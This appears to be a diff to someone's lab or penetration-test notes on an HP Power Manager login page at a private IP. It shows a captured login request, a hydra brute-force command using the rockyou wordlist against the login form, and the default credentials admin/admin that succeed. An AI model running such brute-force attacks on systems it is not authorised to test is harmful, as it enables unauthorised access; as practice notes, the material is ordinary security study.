@@ -161,3 +161,39 @@ ________________________________________________
 > HP Power Manager login page
 
 ![](image.png)
+
+> POST
+
+![](image_1.png)
+
+```txt
+POST /goform/formLogin HTTP/1.1
+Host: 192.168.69.45
+Content-Length: 68
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
+Origin: http://192.168.69.45
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.69.45/index.asp
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+HtmlOnly=true&Login=admin&Password=password&loginButton=Submit+Login
+```
+
+```bash
+hydra -L /path/to/users.txt -P /usr/share/wordlists/rockyou.txt 192.168.69.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
+```
+
+> admin/admin
+> http://192.168.69.45/Contents/index.asp
+
+![](image_2.png)
+
+> No exists Header Token
+> I doubt the IP based trust machanism
+
+![](image_3.png)
